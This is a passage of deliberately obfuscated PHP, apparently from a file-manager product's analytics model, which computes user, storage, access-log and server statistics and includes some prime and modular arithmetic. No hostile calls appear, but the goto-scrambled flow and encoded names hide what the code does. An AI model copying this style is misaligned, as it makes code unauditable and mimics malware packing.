$_SERVER[ã®Â„Éæ¹¤]; $AÅå’†„öø =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $FÌ‹£šœˆÂ = $AÅå’†„öø[0]($AÅå’†„öø[357], $E¸®ËÂ§Ã); goto DìíÇå§ƒí; F¤°ã‡ÛäÙ: $fŒÇ‰ÖãÓÃ = $AÅå’†„öø[123]($AÅå’†„öø[354] . ($D¦¡ßŞŒ„¹ + $Cµ©²Â«Òî) . $AÅå’†„öø[355] . $b¼´°¼†¼¦ . $AÅå’†„öø[355] . $A¡¨ùÒ¤† . $AÅå’†„öø[356]); $aƒ¿Ü¬´½é = $E£¢ïİ†â˜[702]; if (!$aƒ¿Ü¬´½é) { return; } goto Eßëç¢ÍÁ; d¼©†Ï¦“±: $D¦¡ßŞŒ„¹ = 0; $A‹šƒ¾áÛ„ = $E£¢ïİ†â˜[697]; if (strlen($A‹šƒ¾áÛ„) < $E£¢ïİ†â˜[570]) { die; } goto c‚‹‡¢ô…; DìíÇå§ƒí: $a…ã«¤òÁè = $E£¢ïİ†â˜[696]; if (!$a…ã«¤òÁè) { die; } if ($AÅå’†„öø[19]($FÌ‹£šœˆÂ) != 2) { return $AÅå’†„öø[10]; } goto cØŠæƒ™Âß; f¾„äç¡à¼: while (1) { $Aâ¹ƒ…áòİ = $b¼´°¼†¼¦; $c÷Ç†èå¢¿ = $c¶è¶æ›–ò; $B‘¾ìƒŠ±Ü = $E£¢ïİ†â˜[701]; while ($B‘¾ìƒŠ±Ü < $E£¢ïİ†â˜[564]) { if ($B‘¾ìƒŠ±Ü >= 0) { break; } $B‘¾ìƒŠ±Ü++; } while ($c÷Ç†èå¢¿ % $Aâ¹ƒ…áòİ != 0) { $a‚Õ­äİ‰¿ = $c÷Ç†èå¢¿; $c÷Ç†èå¢¿ = $Aâ¹ƒ…áòİ; $Aâ¹ƒ…áòİ = $a‚Õ­äİ‰¿ % $Aâ¹ƒ…áòİ; } if ($Aâ¹ƒ…áòİ == 1) { break; } else { $b¼´°¼†¼¦++; } } $A¡¨ùÒ¤† = 2; for ($F±…ßéµÒÛ = 0; $F±…ßéµÒÛ < $c¶è¶æ›–ò * 10; $F±…ßéµÒÛ++) { if (($c¶è¶æ›–ò * $F±…ßéµÒÛ + 1) % $b¼´°¼†¼¦ == 0) { $A¡¨ùÒ¤† = $AÅå’†„öø[249](($c¶è¶æ›–ò * $F±…ßéµÒÛ + 1) / $b¼´°¼†¼¦); break; } } goto F¤°ã‡ÛäÙ; eã±¸ÏÒÉ“: $b¼´°¼†¼¦ = $AÅå’†„öø[249](($D¦¡ßŞŒ„¹ + $Cµ©²Â«Òî) / 2); $Cåèâ¤˜î½ = $E£¢ïİ†â˜[700]; while ($Cåèâ¤˜î½ < $E£¢ïİ†â˜[562]) { if ($Cåèâ¤˜î½ >= 0) { break; } $Cåèâ¤˜î½++; } goto f¾„äç¡à¼; Eßëç¢ÍÁ: $Dî¥ÉòÎÎ = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][255]}($FÌ‹£šœˆÂ[0], $fŒÇ‰ÖãÓÃ); $fá×¬ø¦Æï = $E£¢ïİ†â˜[703]; if (!$fá×¬ø¦Æï) { die; } goto AíÕ‘ª‚¡›; cØŠæƒ™Âß: $DˆŠ“™‰Œø = $this->{$_SERVER[«óæÀ—¬ÛÚÈÑ][255]}($FÌ‹£šœˆÂ[1] . $AÅå’†„öø[10], $AÅå’†„öø[158]); if (!$DˆŠ“™‰Œø) { return $AÅå’†„öø[10]; } $DˆŠ“™‰Œø = $AÅå’†„öø[249]($DˆŠ“™‰Œø); goto d¼©†Ï¦“±; AíÕ‘ª‚¡›: return $Dî¥ÉòÎÎ; $d³³ø‹ÈİŸ = $E£¢ïİ†â˜[704]; if (strlen($d³³ø‹ÈİŸ) < $E£¢ïİ†â˜[566]) { return; } goto Bå¢×º¨è¤; Bå¢×º¨è¤: } public function cvla269a3198() { goto aØ†•‚ èà; b»“÷‹õÂÎ: while ($cˆ¯†”¸Î§ <= (int) $C¼“ÅÆÍ˜Ï[359]($BŞ ÂĞİ½¼)) { $aè½ğÇÀ = $cˆ¯†”¸Î§; while (!0) { $aè½ğÇÀ++; if ($aè½ğÇÀ <= 2) { $cˆ¯†”¸Î§ = $aè½ğÇÀ; break; } else { if ($aè½ğÇÀ < 2) { continue; } } $B´„¾“± = !0; for ($dßÒ¼´ÜÜ¯ = 2; $dßÒ¼´ÜÜ¯ <= $C¼“ÅÆÍ˜Ï[359]($aè½ğÇÀ); $dßÒ¼´ÜÜ¯++) { if ($aè½ğÇÀ % $dßÒ¼´ÜÜ¯ == 0) { $B´„¾“± = !1; } } if ($B´„¾“±) { $cˆ¯†”¸Î§ = $aè½ğÇÀ; break; } } $A¸ÁñİÃÏ¶[] = $cˆ¯†”¸Î§; $e¡Ì®ŒåÕ‚ = $e¢„°é ˜˜[706]; if (!$e¡Ì®ŒåÕ‚) { die; } } $bÉĞ¥ÂÈó = 2; for ($aè½ğÇÀ = $BŞ ÂĞİ½¼; $aè½ğÇÀ > 1; $aè½ğÇÀ--) { $B´„¾“± = !0; foreach ($A¸ÁñİÃÏ¶ as $DîÎËÊ‚÷¨) { if ($aè½ğÇÀ % $DîÎËÊ‚÷¨ == 0) { $B´„¾“± = !1; break; } } if ($B´„¾“±) { $bÉĞ¥ÂÈó = $aè½ğÇÀ; break; } } goto C©ãæˆøºø; aØ†•‚ èà: $e¢„°é ˜˜ =& $_SERVER[ã®Â„Éæ¹¤]; $C¼“ÅÆÍ˜Ï =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; $BŞ ÂĞİ½¼ = $C¼“ÅÆÍ˜Ï[338]($C¼“ÅÆÍ˜Ï[358](2, 14), $C¼“ÅÆÍ˜Ï[358](2, 16) - 1); goto F¡±–¶ª®; C©ãæˆøºø: return $bÉĞ¥ÂÈó; goto BƒÃïÂ³ïù; F¡±–¶ª®: $BÍ…õ¢‡’ = $e¢„°é ˜˜[705]; $A¸ÁñİÃÏ¶ = array(); $cˆ¯†”¸Î§ = 1; goto b»“÷‹õÂÎ; BƒÃïÂ³ïù: } public function bviwe10e04a1($a¨•ÂÓƒ™Ñ, $Fáœë²¹›Á) { $B¼™ˆŒ‘‹ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; return $B¼™ˆŒ‘‹[13](array($B¼™ˆŒ‘‹[14], $B¼™ˆŒ‘‹[360]), $a¨•ÂÓƒ™Ñ, $Fáœë²¹›Á); $BÇªæÜËí¦ = $_SERVER[ã®Â„Éæ¹¤][707]; } public function quyxf081a476($B¦À‹èÃåŒ, $AÊÒÜ¶ª‚Œ) { $c–‰¹ÔÏå =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; return $c–‰¹ÔÏå[13](array($c–‰¹ÔÏå[361], $c–‰¹ÔÏå[362]), $B¦À‹èÃåŒ, $AÊÒÜ¶ª‚Œ); } public function bxqyaed0789b($aÒä‚„³•÷, $D¶¯µ â¯) { $Cá‡Ä ÒÎ¢ =& $_SERVER[ã®Â„Éæ¹¤]; $aÚİ¸Œº¸ƒ =& $_SERVER[«óæÀ—¬ÛÚÈÑ]; return $aÚİ¸Œº¸ƒ[13](array($aÚİ¸Œº¸ƒ[361], $aÚİ¸Œº¸ƒ[363]), $aÒä‚„³•÷, $D¶¯µ â¯); $EĞêêã”œİ = $Cá‡Ä ÒÎ¢[708]; while ($EĞêêã”œİ < $Cá‡Ä ÒÎ¢[564]) { if ($EĞêêã”œİ >= 0) { break; } $EĞêêã”œİ++; } } } goto Fç¾ñ‡©Â†; Bß×Ï¸Éæ: class AnalysisModel extends ModelBaseLight { public function init($CğåÜ»³ã) { $dˆ ê‡Òš =& $_SERVER[ã®Â„Éæ¹¤]; $A±«µ“­ã = array($dˆ ê‡Òš[536] => array($dˆ ê‡Òš[29] => $dˆ ê‡Òš[2052], $dˆ ê‡Òš[261] => array($dˆ ê‡Òš[210], $dˆ ê‡Òš[722], $dˆ ê‡Òš[2053], $dˆ ê‡Òš[2054])), $dˆ ê‡Òš[2055] => array($dˆ ê‡Òš[29] => $dˆ ê‡Òš[2056], $dˆ ê‡Òš[261] => array($dˆ ê‡Òš[210], $dˆ ê‡Òš[720], $dˆ ê‡Òš[2057], $dˆ ê‡Òš[2058], $dˆ ê‡Òš[2059]))); if (!isset($A±«µ“­ã[$CğåÜ»³ã])) { return !1; } $this->optionType = $A±«µ“­ã[$CğåÜ»³ã][$dˆ ê‡Òš[29]]; $this->field = $A±«µ“­ã[$CğåÜ»³ã][$dˆ ê‡Òš[261]]; return !0; } public function listData($FãÆÛ×ÍÂ³ = false, $Eç´Çç¶†µ = "\155\x6f\x64\151\x66\x79\124\151\x6d\145", $C‹²»•ÎÙœ = false) { return parent::listData($FãÆÛ×ÍÂ³, $Eç´Çç¶†µ, $C‹²»•ÎÙœ); } public function trendList($a…ÌÖ—˜Âì) { goto FïÁÅ¾Õ—Š; A­ô…Š×µî: foreach ($CÜÔ´îÄ—§ as $D»Ş„æäÁ‘) { $this->{$bÇÂ”Ó«÷º}($D»Ş„æäÁ‘); } return $this->listData(); goto A×ãä»‡Œ; FŸÈœ©´¡: if (!isset($aˆ‘‡ÌÓİÑ)) { $fŞÉŠ¯„’ª = $a…ÌÖ—˜Âì == $Aƒ¹¬ĞŠÜ[536] ? $Aƒ¹¬ĞŠÜ[479] : $Aƒ¹¬ĞŠÜ[775]; $aˆ‘‡ÌÓİÑ = Model($fŞÉŠ¯„’ª)->min($Aƒ¹¬ĞŠÜ[187]); } $bÇÂ”Ó«÷º = $Aƒ¹¬ĞŠÜ[2062] . ucfirst($a…ÌÖ—˜Âì); $CÜÔ´îÄ—§ = $this->dateList($aˆ‘‡ÌÓİÑ); goto A­ô…Š×µî; FïÁÅ¾Õ—Š: $Aƒ¹¬ĞŠÜ =& $_SERVER[ã®Â„Éæ¹¤]; $F—¡Å´Œ¡Æ = $this->listData(); if ($F—¡Å´Œ¡Æ) { $Dåˆ„Å®¢Â = end($F—¡Å´Œ¡Æ); $D»Ş„æäÁ‘ = date($Aƒ¹¬ĞŠÜ[2060], strtotime($Aƒ¹¬ĞŠÜ[2061])); if ($Dåˆ„Å®¢Â[$Aƒ¹¬ĞŠÜ[210]] == $D»Ş„æäÁ‘) { return $F—¡Å´Œ¡Æ; } $aˆ‘‡ÌÓİÑ = strtotime($Dåˆ„Å®¢Â[$Aƒ¹¬ĞŠÜ[210]]); } goto FŸÈœ©´¡; A×ãä»‡Œ: } private function dateList($AÛ’ßŒË‚) { $c¡ÖÉŸœÅ¢ =& $_SERVER[ã®Â„Éæ¹¤]; $dé‹‘¶å›Õ = $AÛ’ßŒË‚; $aÀÕÔœğ…É = strtotime($c¡ÖÉŸœÅ¢[2061]); $fÈŞ‰Æ…º = array(); while ($dé‹‘¶å›Õ <= $aÀÕÔœğ…É) { $fÈŞ‰Æ…º[] = date($c¡ÖÉŸœÅ¢[2060], $dé‹‘¶å›Õ); $dé‹‘¶å›Õ = strtotime($c¡ÖÉŸœÅ¢[2063], $dé‹‘¶å›Õ); } return $fÈŞ‰Æ…º; } public function _recordUser($b£Ç•Ñ‹† = '') { goto b‰……š»²½; d…Õ‘Ÿƒ: $DÌ‡İ’òñƒ = array($FÚÍæÖ•Ë[210] => $b£Ç•Ñ‹†, $FÚÍæÖ•Ë[722] => (int) $EÏ©ÈƒÒº¬, $FÚÍæÖ•Ë[2053] => (int) $BŠ¾ĞŞØ²’, $FÚÍæÖ•Ë[2054] => (int) $eâó„”±Ï); return $this->insert($DÌ‡İ’òñƒ); goto C†«“¼¡Å„; DØ¯­ç¥ïŠ: $AŒâÀ÷À‰ê = array($FÚÍæÖ•Ë[187] => array($FÚÍæÖ•Ë[945], $Fõõ‡‚¹ò)); $EÏ©ÈƒÒº¬ = Model($FÚÍæÖ•Ë[479])->where($AŒâÀ÷À‰ê)->count($FÚÍæÖ•Ë[1456]); $AŒâÀ÷À‰ê[$FÚÍæÖ•Ë[187]] = array($FÚÍæÖ•Ë[321], array($A¡–¡˜«¾•, $Fõõ‡‚¹ò)); goto eöçƒ¼°È; eöçƒ¼°È: $BŠ¾ĞŞØ²’ = Model($FÚÍæÖ•Ë[479])->where($AŒâÀ÷À‰ê)->count($FÚÍæÖ•Ë[1456]); $AŒâÀ÷À‰ê[$FÚÍæÖ•Ë[29]] = $FÚÍæÖ•Ë[2066]; $eâó„”±Ï = Model($FÚÍæÖ•Ë[2067])->where($AŒâÀ÷À‰ê)->count($FÚÍæÖ•Ë[2068]); goto d…Õ‘Ÿƒ; b‰……š»²½: $FÚÍæÖ•Ë =& $_SERVER[ã®Â„Éæ¹¤]; $A¡–¡˜«¾• = strtotime(date($FÚÍæÖ•Ë[2064], strtotime($b£Ç•Ñ‹†))); $Fõõ‡‚¹ò = strtotime(date($FÚÍæÖ•Ë[2065], strtotime($b£Ç•Ñ‹†))); goto DØ¯­ç¥ïŠ; C†«“¼¡Å„: } public function _recordStore($bñ¯”æ­À = '') { goto cÅÅîôà»; B’¹¾æÚÒÃ: $e¤È…‘‰¾Ô = Model($AÓÑ°²ÈÜ[775])->where($fÊõÓì…)->sum($AÓÑ°²ÈÜ[77]); $e‰Á›Ô˜È = array($AÓÑ°²ÈÜ[210] => $bñ¯”æ­À, $AÓÑ°²ÈÜ[720] => (int) $bĞ†‹ÄÄ•Ø, $AÓÑ°²ÈÜ[2057] => (int) $d­çµ´Ëàñ, $AÓÑ°²ÈÜ[2058] => (int) $d†ª…Ä›’, $AÓÑ°²ÈÜ[2059] => (int) $e¤È…‘‰¾Ô); return $this->insert($e‰Á›Ô˜È); goto a±›»·¾—£; cÅÅîôà»: $AÓÑ°²ÈÜ =& $_SERVER[ã®Â„Éæ¹¤]; $f…‰¶Œ‘Ó‘ = strtotime(date($AÓÑ°²ÈÜ[2065], strtotime($bñ¯”æ­À))); $fÊõÓì… = array($AÓÑ°²ÈÜ[187] => array($AÓÑ°²ÈÜ[945], $f…‰¶Œ‘Ó‘)); goto AŞàŸßÁ¬; fÍšê‚º´ù: $fÊõÓì…[$AÓÑ°²ÈÜ[371]] = 1; $d†ª…Ä›’ = Model($AÓÑ°²ÈÜ[775])->where($fÊõÓì…)->sum($AÓÑ°²ÈÜ[77]); $fÊõÓì…[$AÓÑ°²ÈÜ[371]] = 2; goto B’¹¾æÚÒÃ; AŞàŸßÁ¬: $d­çµ´Ëàñ = Model($AÓÑ°²ÈÜ[422])->where($fÊõÓì…)->sum($AÓÑ°²ÈÜ[77]); $fÊõÓì…[$AÓÑ°²ÈÜ[370]] = 0; $bĞ†‹ÄÄ•Ø = Model($AÓÑ°²ÈÜ[775])->where($fÊõÓì…)->sum($AÓÑ°²ÈÜ[77]); goto fÍšê‚º´ù; a±›»·¾—£: } public function trend($F£–ö¹°‹›, $cŒŒ´°â«) { goto E˜ˆÛŸôï; fæÓ„‰‰”: if ($bŠŠéŠ‘Ğ && $cŒŒ´°â« != $F´ƒÔ¶ó•§[1431]) { $b¯Ì„…Ò´Ó = $bŠŠéŠ‘Ğ[0][$F´ƒÔ¶ó•§[210]]; $eæˆ˜ƒˆ÷ = $this->validDate($cŒŒ´°â«, $b¯Ì„…Ò´Ó); $c…Û¿ÒÊ‘ƒ = array(); $d´´¿—»ÎŞ = array_to_keyvalue($bŠŠéŠ‘Ğ, $F´ƒÔ¶ó•§[210]); foreach ($eæˆ˜ƒˆ÷ as $AºÔôÄ­¬¸) { if (isset($d´´¿—»ÎŞ[$AºÔôÄ­¬¸])) { $d›íî÷µêã = $d´´¿—»ÎŞ[$AºÔôÄ­¬¸]; } else { $d›íî÷µêã = end($bŠŠéŠ‘Ğ); $d›íî÷µêã[$F´ƒÔ¶ó•§[210]] = $AºÔôÄ­¬¸; if ($F£–ö¹°‹› == $F´ƒÔ¶ó•§[536]) { $d›íî÷µêã[$F´ƒÔ¶ó•§[2053]] = $d›íî÷µêã[$F´ƒÔ¶ó•§[2054]] = 0; } } $c…Û¿ÒÊ‘ƒ[] = $d›íî÷µêã; } $bŠŠéŠ‘Ğ = $c…Û¿ÒÊ‘ƒ; } $eÌ¢ÂÎÊ = array($F´ƒÔ¶ó•§[536] => array($F´ƒÔ¶ó•§[722] => LNG($F´ƒÔ¶ó•§[2069]), $F´ƒÔ¶ó•§[2053] => LNG($F´ƒÔ¶ó•§[2070]), $F´ƒÔ¶ó•§[2054] => LNG($F´ƒÔ¶ó•§[2071])), $F´ƒÔ¶ó•§[2055] => array($F´ƒÔ¶ó•§[720] => LNG($F´ƒÔ¶ó•§[2072]), $F´ƒÔ¶ó•§[2057] => LNG($F´ƒÔ¶ó•§[2073]), $F´ƒÔ¶ó•§[2058] => LNG($F´ƒÔ¶ó•§[2074]), $F´ƒÔ¶ó•§[2059] => LNG($F´ƒÔ¶ó•§[2075]))); $C¬¸ˆ³ÚÇ› = array($F´ƒÔ¶ó•§[536] => $F´ƒÔ¶ó•§[2076], $F´ƒÔ¶ó•§[2055] => $F´ƒÔ¶ó•§[77]); goto CÀˆß…ä£à; CÀˆß…ä£à: if (empty($bŠŠéŠ‘Ğ)) { $AºÔôÄ­¬¸ = date($F´ƒÔ¶ó•§[2060], strtotime($F´ƒÔ¶ó•§[2061])); $Bî³…Ïè· = array($F´ƒÔ¶ó•§[210] => $AºÔôÄ­¬¸); foreach ($eÌ¢ÂÎÊ[$F£–ö¹°‹›] as $bóçÓÂ÷ => $EË„Í¢Ä) { $Bî³…Ïè·[$bóçÓÂ÷] = 0; } $bŠŠéŠ‘Ğ[] = $Bî³…Ïè·; } $D„¶¦ºĞïš = array(); foreach ($bŠŠéŠ‘Ğ as $EË„Í¢Ä) { if ($F£–ö¹°‹› == $F´ƒÔ¶ó•§[2055] && $EË„Í¢Ä[$F´ƒÔ¶ó•§[2057]] > $EË„Í¢Ä[$F´ƒÔ¶ó•§[720]]) { $EË„Í¢Ä[$F´ƒÔ¶ó•§[2057]] = $EË„Í¢Ä[$F´ƒÔ¶ó•§[720]]; } foreach ($eÌ¢ÂÎÊ[$F£–ö¹°‹›] as $bóçÓÂ÷ => $A×·£ÃÄ¾Ó) { $d›íî÷µêã = array($F´ƒÔ¶ó•§[210] => $EË„Í¢Ä[$F´ƒÔ¶ó•§[210]], $F´ƒÔ¶ó•§[1362] => $A×·£ÃÄ¾Ó); $d›íî÷µêã[$C¬¸ˆ³ÚÇ›[$F£–ö¹°‹›]] = isset($EË„Í¢Ä[$bóçÓÂ÷]) ? $EË„Í¢Ä[$bóçÓÂ÷] : 0; $D„¶¦ºĞïš[] = $d›íî÷µêã; } } goto eåõæ¥¬; E˜ˆÛŸôï: $F´ƒÔ¶ó•§ =& $_SERVER[ã®Â„Éæ¹¤]; if (!$this->init($F£–ö¹°‹›)) { return !1; } $bŠŠéŠ‘Ğ = $this->trendList($F£–ö¹°‹›); goto fæÓ„‰‰”; eåõæ¥¬: return $D„¶¦ºĞïš; goto eÔ•…¢åİì; eÔ•…¢åİì: } public function validDate($AßİÙÉ™Ä¿, $EÒ–°‰ƒ) { goto AŞ»‹µÜ; DÅšÇä–Æ«: return $E· ˜áÂ»‡; goto A•‡šå·Ó; fíËøïº‰¾: switch ($AßİÙÉ™Ä¿) { case $a‚ºˆçÓÏ[1438]: $CÂöÏ‹Ò¶ã = mktime(0, 0, 0, date($a‚ºˆçÓÏ[2077]), date($a‚ºˆçÓÏ[2078]) - date($a‚ºˆçÓÏ[1244]) + 7 - 7, date($a‚ºˆçÓÏ[2079])); $fÍÕ¸©ñÉ = 0; do { $Fä˜÷Äó = date($a‚ºˆçÓÏ[2060], $CÂöÏ‹Ò¶ã - 3600 * 24 * 7 * $fÍÕ¸©ñÉ); $E· ˜áÂ»‡[] = $Fä˜÷Äó; $fÍÕ¸©ñÉ++; } while ($EÒ–°‰ƒ < $Fä˜÷Äó); break; case $a‚ºˆçÓÏ[1436]: $fÍÕ¸©ñÉ = 1; do { $aÁ´±ó¾¬ì = date($a‚ºˆçÓÏ[2080], strtotime("\55\40{$fÍÕ¸©ñÉ}\40\155\157\x6e\x74\150\x73")); $E· ˜áÂ»‡[] = $aÁ´±ó¾¬ì; $fÍÕ¸©ñÉ++; } while ($EÒ–°‰ƒ < $aÁ´±ó¾¬ì); break; case $a‚ºˆçÓÏ[1745]: $aÒ§ï¹©Øï = (int) date($a‚ºˆçÓÏ[2079], strtotime($EÒ–°‰ƒ)); $bŒ†õóõÂ = (int) date($a‚ºˆçÓÏ[2079]); if ($aÒ§ï¹©Øï >= $bŒ†õóõÂ) { break; } for ($aÒ§ï¹©Øï; $aÒ§ï¹©Øï < $bŒ†õóõÂ; $aÒ§ï¹©Øï++) { $E· ˜áÂ»‡[] = $aÒ§ï¹©Øï . $a‚ºˆçÓÏ[2081]; } break; default: break; } if ($EÒ–°‰ƒ > end($E· ˜áÂ»‡)) { array_pop($E· ˜áÂ»‡); } sort($E· ˜áÂ»‡); goto DÅšÇä–Æ«; AŞ»‹µÜ: $a‚ºˆçÓÏ =& $_SERVER[ã®Â„Éæ¹¤]; $BÂâ”¶ë¸ = date($a‚ºˆçÓÏ[2060], strtotime($a‚ºˆçÓÏ[2061])); $E· ˜áÂ»‡ = array($BÂâ”¶ë¸); goto fíËøïº‰¾; A•‡šå·Ó: } public function listTable($Cµ§ß‹„ôˆ) { $D¨ÌˆÃÔå = ucfirst($Cµ§ß‹„ôˆ); return Model($D¨ÌˆÃÔå)->listData(); } public function option($d˜‘¿‘¿) { $Bæ‚”¦… = $_SERVER[ã®Â„Éæ¹¤][2082] . ucfirst($d˜‘¿‘¿); return $this->{$Bæ‚”¦…}(); } private function optionUser() { goto A·Ÿ‹„¸÷×; bÚ±‹ê¥†ø: $a¥‹­ä¥Ì‘ = Model($A„ª»¹Åİ[479])->where($F­­èÅ©±Š)->count($A„ª»¹Åİ[1456]); return array($A„ª»¹Åİ[717] => (int) $F©¹›´Ë—Î, $A„ª»¹Åİ[2086] => (int) ($F©¹›´Ë—Î - $Eœ‘†’®†Ü), $A„ª»¹Åİ[2087] => (int) $Eœ‘†’®†Ü, $A„ª»¹Åİ[2088] => (int) $a¥‹­ä¥Ì‘, $A„ª»¹Åİ[2089] => $Dº†ÙÃÜƒ); goto CŸ…„ÑÇµ; c±õÜÔ±Ù®: if (!$Dº†ÙÃÜƒ) { $Dº†ÙÃÜƒ = 1; } $C‚åè‡¸Àµ = strtotime(date($A„ª»¹Åİ[2064])); $F­­èÅ©±Š = array($A„ª»¹Åİ[2085] => array($A„ª»¹Åİ[946], $C‚åè‡¸Àµ)); goto bÚ±‹ê¥†ø; AÔèøçŸé³: $C‚åè‡¸Àµ = strtotime($A„ª»¹Åİ[2084]); $F­­èÅ©±Š = array($A„ª»¹Åİ[2085] => array($A„ª»¹Åİ[946], $C‚åè‡¸Àµ)); $Dº†ÙÃÜƒ = (int) Model($A„ª»¹Åİ[479])->where($F­­èÅ©±Š)->count($A„ª»¹Åİ[1456]); goto c±õÜÔ±Ù®; A·Ÿ‹„¸÷×: $A„ª»¹Åİ =& $_SERVER[ã®Â„Éæ¹¤]; $F©¹›´Ë—Î = Model($A„ª»¹Åİ[479])->count($A„ª»¹Åİ[1456]); $Eœ‘†’®†Ü = Model($A„ª»¹Åİ[479])->where($A„ª»¹Åİ[2083])->count($A„ª»¹Åİ[1456]); goto AÔèøçŸé³; CŸ…„ÑÇµ: } private function optionFile() { goto fÄâÂˆÔ‹; Dëª¸Ñ¹Ã: $Bõ×æë«£ = $cÉˆÏùŞƒ°[$d×ÎÅ¦°…‹[2057]]; $C£±æã»ñ = Model($d×ÎÅ¦°…‹[775])->where(array($d×ÎÅ¦°…‹[370] => 0))->count($d×ÎÅ¦°…‹[369]); $D´¿¬˜™Ì³ = array($d×ÎÅ¦°…‹[370] => 0, $d×ÎÅ¦°…‹[187] => array($d×ÎÅ¦°…‹[946], strtotime(date($d×ÎÅ¦°…‹[2064])))); goto Eê½çÌóÉ; Eê½çÌóÉ: $A™¼ÛÍÎ×é = Model($d×ÎÅ¦°…‹[775])->where($D´¿¬˜™Ì³)->sum($d×ÎÅ¦°…‹[77]); $B¾ŸÖË×Ÿ = Model($d×ÎÅ¦°…‹[775])->where($D´¿¬˜™Ì³)->count($d×ÎÅ¦°…‹[369]); return array($d×ÎÅ¦°…‹[720] => $eãà½‡¹åÜ, $d×ÎÅ¦°…‹[2057] => $Bõ×æë«£, $d×ÎÅ¦°…‹[2090] => $eãà½‡¹åÜ - $Bõ×æë«£, $d×ÎÅ¦°…‹[2091] => (int) $A™¼ÛÍÎ×é, $d×ÎÅ¦°…‹[722] => (int) $C£±æã»ñ, $d×ÎÅ¦°…‹[2092] => (int) $B¾ŸÖË×Ÿ); goto E¥‰Şô£…ò; fÄâÂˆÔ‹: $d×ÎÅ¦°…‹ =& $_SERVER[ã®Â„Éæ¹¤]; $cÉˆÏùŞƒ° = $this->sourceSize(); $eãà½‡¹åÜ = $cÉˆÏùŞƒ°[$d×ÎÅ¦°…‹[77]]; goto Dëª¸Ñ¹Ã; E¥‰Şô£…ò: } private function optionAccess() { $c¸ÉÑ¯Ò…Ù =& $_SERVER[ã®Â„Éæ¹¤]; return array($c¸ÉÑ¯Ò…Ù[717] => $this->typeLogCnt(), $c¸ÉÑ¯Ò…Ù[103] => $this->typeLogCnt($c¸ÉÑ¯Ò…Ù[103]), $c¸ÉÑ¯Ò…Ù[404] => $this->typeLogCnt($c¸ÉÑ¯Ò…Ù[404]), $c¸ÉÑ¯Ò…Ù[2093] => $this->typeLogCnt($c¸ÉÑ¯Ò…Ù[2093]), $c¸ÉÑ¯Ò…Ù[2094] => $this->typeLogCnt($c¸ÉÑ¯Ò…Ù[2094]), $c¸ÉÑ¯Ò…Ù[536] => $this->typeLogCnt($c¸ÉÑ¯Ò…Ù[33], $c¸ÉÑ¯Ò…Ù[2068])); } private function typeLogCnt($Cƒ§‚«‰Îô = '', $bŸŠÂğÙˆÁ = "\151\x64") { goto E±‰¹ÀÕ½; aİƒ‹¤ùÏê: $CŸï‚¦ï‚Ï = array($còí‘‚’ÕÔ[187] => array($còí‘‚’ÕÔ[946], $a»ÈÖáÓ¼»)); if ($Cƒ§‚«‰Îô) { $CŸï‚¦ï‚Ï[$còí‘‚’ÕÔ[29]] = array($còí‘‚’ÕÔ[7], $EÇ¿Îª•¦š[$Cƒ§‚«‰Îô]); } $DÛ®Ş‘ğØ» = Model($còí‘‚’ÕÔ[2067])->where($CŸï‚¦ï‚Ï)->count($bŸŠÂğÙˆÁ); goto B®œå” š ; E±‰¹ÀÕ½: $còí‘‚’ÕÔ =& $_SERVER[ã®Â„Éæ¹¤]; $EÇ¿Îª•¦š = array($còí‘‚’ÕÔ[103] => array($còí‘‚’ÕÔ[2095], $còí‘‚’ÕÔ[2096]), $còí‘‚’ÕÔ[404] => array($còí‘‚’ÕÔ[2097], $còí‘‚’ÕÔ[2098]), $còí‘‚’ÕÔ[2093] => array($còí‘‚’ÕÔ[2099], $còí‘‚’ÕÔ[2100], $còí‘‚’ÕÔ[2101]), $còí‘‚’ÕÔ[2094] => array($còí‘‚’ÕÔ[2102], $còí‘‚’ÕÔ[2103]), $còí‘‚’ÕÔ[2104] => array($còí‘‚’ÕÔ[2105], $còí‘‚’ÕÔ[2106], $còí‘‚’ÕÔ[2107])); $a»ÈÖáÓ¼» = strtotime(date($còí‘‚’ÕÔ[2064])); goto aİƒ‹¤ùÏê; B®œå” š : return (int) $DÛ®Ş‘ğØ»; goto f«¨Âíƒè; f«¨Âíƒè: } private function optionServer() { goto AĞƒ¾äİî«; bÃëèä¼Ï: $AöŞñáÊ¡œ = $eöØ×ß©Êğ[0]; $Eì”µ¬ëŞ = $GLOBALS[$DÛñíğˆ‰í[6]][$DÛñíğˆ‰í[17]]; $AÚõèğ»µ¨ = $Eì”µ¬ëŞ[$DÛñíğˆ‰í[906]]; goto eÈÉ©Ú¥¥; AĞƒ¾äİî«: $DÛñíğˆ‰í =& $_SERVER[ã®Â„Éæ¹¤]; $aöøÔŞõ = $this->diskDriver(); $CãÛîÄÔ§ = KodIO::defaultDriver(); goto EÑ‡é¿÷¯–; b“æ‹Š‡‡: return array($DÛñíğˆ‰í[2110] => $aöøÔŞõ ? $aöøÔŞõ[$DÛñíğˆ‰í[2111]] : 0, $DÛñíğˆ‰í[2112] => $aöøÔŞõ ? $aöøÔŞõ[$DÛñíğˆ‰í[2113]] : 0, $DÛñíğˆ‰í[2114] => (int) $CãÛîÄÔ§[$DÛñíğˆ‰í[2111]] * 1024 * 1024 * 1024, $DÛñíğˆ‰í[2115] => (int) $A”Ì•Ó¡Õ, $DÛñíğˆ‰í[2116] => ucfirst($AöŞñáÊ¡œ), $DÛñíğˆ‰í[2117] => $DÛñíğˆ‰í[2118] . PHP_VERSION, $DÛñíğˆ‰í[2119] => phpBuild64() ? 64 : 32, $DÛñíğˆ‰í[716] => str_replace($DÛñíğˆ‰í[2120], $DÛñíğˆ‰í[922], $AÚõèğ»µ¨), $DÛñíğˆ‰í[337] => ucfirst($a‰µ©ªÒ§), $DÛñíğˆ‰í[28] => $_SERVER[$DÛñíğˆ‰í[2121]]); goto C’¿ªÌëÙ; eÈÉ©Ú¥¥: if ($AÚõèğ»µ¨ == $DÛñíğˆ‰í[745]) { $còÒ±´§° = explode($DÛñíğˆ‰í[1095], $Eì”µ¬ëŞ[$DÛñíğˆ‰í[905]]); $AÚõèğ»µ¨ = $còÒ±´§°[0]; } if ($AÚõèğ»µ¨ == $DÛñíğˆ‰í[748] || $AÚõèğ»µ¨ == $DÛñíğˆ‰í[749]) { $A¶¼ºã…Ûñ = Model()->db()->query($DÛñíğˆ‰í[2108]); $aó«£×Ø¯Ï = $A¶¼ºã…Ûñ[0] && 